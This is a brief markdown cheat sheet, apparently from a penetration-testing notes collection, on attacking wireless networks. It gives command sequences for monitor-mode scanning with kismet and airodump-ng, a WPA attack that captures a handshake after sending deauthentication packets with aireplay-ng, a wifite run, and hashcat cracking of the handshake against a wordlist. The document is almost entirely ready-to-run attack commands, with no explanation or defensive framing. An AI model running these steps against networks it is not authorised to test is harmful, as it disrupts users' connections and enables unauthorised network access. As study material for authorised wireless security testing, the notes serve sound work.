# Wireless attacks

[back](readme.md)

## Wireless scanning

### Windows

```
https://www.nirsoft.net/utils/wireless_network_view.html
```

### Linux

#### kismet

```
kismet -c <mon_interface>
```

#### airodump-ng

```
airodump-ng <mon_interface>

# press [SPACE] to pause scanning
# press [TAB] to select wireless network
# press [S] for sorting
# press [M] for color coding a network and it's clients
```

## WPA cracking 

### Aircrack-ng

```
airmon-ng start <interface>
airodump-ng <interface>
airodump-ng --bssid <bssid> -c <channel> --write <out> <interface>
aireplay-ng --deauth 10 -a <bssid of AP> <interface>
aircrack-ng <cap file> -w <wordlist>
```

### Wifite

```
sudo wifite -wpa -mac --skip-crack --wpat 60 --wpadt 10 --no-wps

# more info
https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2

# converting from handshake to crackable hash
https://hashcat.net/cap2hccapx/

.\hashcat64.exe -m 2500 .\handshakes\? ..\..\wordlists\rockyouplus.wordlist
```

